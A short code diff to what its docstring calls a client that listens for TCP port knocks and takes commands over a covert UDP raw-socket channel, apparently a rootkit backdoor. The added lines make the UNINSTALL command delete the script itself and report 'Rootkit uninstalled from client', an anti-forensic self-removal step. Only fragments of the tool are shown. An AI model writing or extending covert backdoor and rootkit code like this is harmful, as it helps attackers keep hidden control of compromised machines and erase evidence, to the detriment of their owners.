@@ -6,7 +6,7 @@ Listens for TCP port knocks, then accepts commands via UDP raw socket covert cha
 REQUIRES: Root/Administrator privileges for raw sockets
 Usage: sudo python3 client.py
 """
-
+import os
 import socket
 import struct
 import time
@@ -334,6 +334,8 @@ class Client:
         elif command_type == CommandType.UNINSTALL:
             print("[*] Processing UNINSTALL")
             print("    Initiating uninstall sequence...")
+            os.remove(sys.argv[0])
+            self.send_response(src_ip, CommandType.ACK, "Rootkit uninstalled from client\n")
 
         elif command_type == CommandType.TRANSFER_TO_CLIENT:
             print("[*] Processing TRANSFER_TO_CLIENT")
